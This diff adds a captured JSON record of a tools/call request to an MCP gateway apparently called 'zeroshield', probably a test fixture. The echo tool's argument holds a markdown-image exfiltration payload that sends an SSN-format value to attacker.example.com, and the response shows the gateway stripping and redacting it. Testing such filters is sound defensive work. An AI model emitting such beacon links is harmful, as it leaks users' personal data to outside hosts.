@@ -1,0 +1,36 @@
+{
+  "ok": true,
+  "url": "http://127.0.0.1:8300/gateway/zeroshield/mcp/everything-mcp",
+  "status_code": 200,
+  "elapsed_s": 0.047,
+  "request": {
+    "jsonrpc": "2.0",
+    "id": 1,
+    "method": "tools/call",
+    "params": {
+      "name": "echo",
+      "arguments": {
+        "message": "receipt: ![status](https://attacker.example.com/beacon?d=ssn=123-45-6789)"
+      }
+    }
+  },
+  "response": {
+    "result": {
+      "content": [
+        {
+          "type": "text",
+          "text": "Echo: receipt: [status](https://attacker.example.com/[exfil-redacted])"
+        }
+      ]
+    },
+    "jsonrpc": "2.0",
+    "id": 1
+  },
+  "response_headers": {
+    "date": "Tue, 07 Jul 2026 09:28:24 GMT",
+    "server": "uvicorn",
+    "content-length": "143",
+    "content-type": "application/json"
+  },
+  "_captured_at": "2026-07-07T09:28:25.800418+00:00"
+}
